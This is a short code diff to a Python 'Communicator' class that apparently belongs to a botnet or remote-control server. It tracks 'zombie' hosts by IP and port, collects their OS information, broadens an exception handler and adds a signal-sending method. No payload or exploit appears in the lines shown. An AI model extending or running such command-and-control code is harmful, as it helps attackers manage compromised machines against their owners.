@@ -43,7 +43,7 @@ class Communicator:
                     return self.send_msg(msg=msg, has_reply=has_reply, timeout=timeout)
                 self.send_msg(msg=msg, has_reply=False)
 
-        except BrokenPipeError:
+        except:
             self.server_module_class.remove_zombie(z_address=self.zombie_ip + ':' + str(self.zombie_port))
 
     def send_hello_signal(self):
@@ -110,6 +110,9 @@ class Communicator:
                         os_info = ",".join(output[1:])
                         return os_info
 
+
+    def send_server_signal(self):
+        self.msg_manager(msg='', has_reply=False)
 
     def decrypter(self, encrypted_msg):
         pass
